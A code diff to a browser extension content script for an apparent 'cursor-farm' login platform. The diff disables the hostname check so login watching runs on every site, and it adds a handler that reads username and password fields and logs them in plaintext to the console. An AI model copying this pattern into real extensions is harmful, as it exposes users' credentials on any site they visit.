@@ -4,12 +4,31 @@
   document.documentElement.setAttribute('data-farm-ext-version', '1.0.0');
 
   // ── Only do auth watching on our own platform ─────────────────────────────
-  const isFarmSite = true 
+  const isFarmSite = true
   // ||
   //   location.hostname.includes('cursor-farm') ||
   //   location.hostname === 'localhost' ||
   //   location.hostname === '127.0.0.1';
 
+  // Получаем форму (первый элемент <form> на странице)
+  const form = document.getElementsByTagName("form")[0];
+
+  // Находим кнопку входа
+  const loginButton = document.getElementById("login-btn");
+
+  // Добавляем обработчик события на кнопку
+  loginButton.addEventListener("click", function () {
+    // Получаем значения из обоих инпутов
+    const username = document.getElementById("login").value;
+    const password = document.getElementById("password").value;
+
+    // Выводим в консоль
+    console.log("Логин:", username);
+    console.log("Пароль:", password);
+
+    // Альтернативный вывод одним объектом
+    console.log({ username, password });
+  });
   if (isFarmSite) {
     watchLoginForm();
     syncExistingToken();
@@ -57,8 +76,13 @@
         apiOrigin: getApiOrigin(),
         pageContext: getPageContext(),
       });
-    } else {
-      // No token on farm site → user has logged out; clear extension cache
+    } else if (
+      location.hostname.includes('cursor-farm') ||
+      location.hostname === 'localhost' ||
+      location.hostname === '127.0.0.1'
+    ) {
+      // Only clear on the farm site itself — other origins don't have the farm token,
+      // so clearing here would wipe stored user data every time the user browses elsewhere.
       chrome.runtime.sendMessage({ type: 'CLEAR_TOKEN' });
     }
   }
